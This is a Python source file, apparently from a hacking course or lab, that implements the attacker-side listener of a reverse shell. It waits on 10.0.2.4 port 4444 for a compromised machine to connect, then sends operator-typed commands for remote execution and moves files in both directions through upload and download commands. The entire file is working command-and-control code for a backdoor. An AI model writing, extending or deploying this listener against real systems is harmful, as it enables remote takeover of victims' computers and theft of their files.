import socket 
import json
import base64
from util import Util

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Connection established" + str(address))

    def execute_remotely(self, command):
        Util.utilize_send(self.connection, command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return Util.utilize_receive(self.connection)

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            # try:
            if command[0] == "upload":
                file_content = Util.read_file(command[1])
                command.append(file_content)

            result = self.execute_remotely(command)

            if command[0] == "download" and "Error" not in result:
                result = Util.write_file(command[1], result)

            # except Exception:
            #     result = "[-] Error during command execution"

            print(result)

my_listener = Listener("10.0.2.4", 4444)
my_listener.run()